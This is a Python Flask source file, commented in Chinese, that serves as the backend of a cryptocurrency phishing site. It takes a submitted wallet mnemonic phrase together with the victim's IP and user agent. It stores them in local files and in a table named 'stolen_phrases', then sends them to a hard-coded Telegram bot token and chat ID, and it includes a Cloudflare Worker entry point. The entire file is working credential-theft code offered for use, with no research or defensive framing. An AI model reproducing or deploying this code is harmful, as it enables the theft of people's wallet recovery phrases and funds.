from flask import Flask, request, render_template
import json
import sqlite3
from datetime import datetime
import os
import requests

app = Flask(__name__)

# =========================================================
# 🔧 Telegram 配置
# =========================================================

TELEGRAM_BOT_TOKEN = '8623442126:AAGTDYUtZP52jZ9Yrp96WN6LtUDk7PRtCCQ'
TELEGRAM_CHAT_ID = '6770563313'

# =========================================================
# 📁 数据存储路径
# =========================================================

DATA_DIR = '/tmp'
DB_PATH = os.path.join(DATA_DIR, 'phishing_data.db')
JSON_PATH = os.path.join(DATA_DIR, 'stolen_data.json')

# =========================================================
# 🏠 首页
# =========================================================

@app.route('/')
def index():
    print("✅ 首页被访问")
    return render_template('index.html')

@app.route('/test')
def test():
    print("✅ /test 路由被访问")
    return "Test route works!"

# =========================================================
# 📩 接收 POST 数据
# =========================================================

@app.route('/', methods=['POST'])
def handle_post():
    print("=" * 60)
    print("📩 收到 POST 请求")
    
    words = request.form.get('words', '')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    print(f"📝 助记词: {words}")
    print(f"🌐 IP: {ip}")
    print(f"🖥️ User-Agent: {user_agent}")
    print("=" * 60)
    
    save_to_file(words, ip, user_agent)
    save_to_db(words, ip, user_agent)
    send_telegram(words, ip, user_agent)
    
    return render_template('index.html')

# =========================================================
# 💾 保存到文件
# =========================================================

def save_to_file(words, ip, user_agent):
    try:
        with open(JSON_PATH, 'r') as f:
            data = json.load(f)
    except FileNotFoundError:
        data = []
    
    data.append({
        'timestamp': datetime.now().isoformat(),
        'words': words,
        'ip': ip,
        'user_agent': user_agent
    })
    
    with open(JSON_PATH, 'w') as f:
        json.dump(data, f, indent=2)
    
    print(f"💾 数据已保存到文件，共 {len(data)} 条记录")

# =========================================================
# 🗄️ 保存到 SQLite 数据库
# =========================================================

def save_to_db(words, ip, user_agent):
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS stolen_phrases (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                words TEXT,
                ip TEXT,
                user_agent TEXT,
                status TEXT DEFAULT 'new'
            )
        ''')
        
        cursor.execute('''
            INSERT INTO stolen_phrases (timestamp, words, ip, user_agent)
            VALUES (?, ?, ?, ?)
        ''', (datetime.now().isoformat(), words, ip, user_agent))
        
        conn.commit()
        print(f"💾 数据已存入数据库，ID: {cursor.lastrowid}")
    except Exception as e:
        print(f"❌ 数据库错误: {e}")
    finally:
        conn.close()

# =========================================================
# 📱 发送 Telegram 通知
# =========================================================

def send_telegram(words, ip, user_agent):
    print("=" * 60)
    print("📱 开始发送 Telegram 通知...")
    
    message = f"""
🎣 新数据捕获！

📝 助记词: {words}
🌐 IP: {ip}
🖥️ User-Agent: {user_agent}
🕐 时间: {datetime.now().isoformat()}
    """
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    
    try:
        response = requests.post(url, data=data, timeout=10)
        if response.status_code == 200:
            print("✅ Telegram 通知已发送")
        else:
            print(f"❌ Telegram 发送失败: {response.text}")
    except Exception as e:
        print(f"❌ Telegram 异常: {e}")
    
    print("=" * 60)

# =========================================================
# ✅ Cloudflare Worker 入口（最关键）
# =========================================================

def fetch(request):
    """处理所有进入的请求"""
    return app(request)
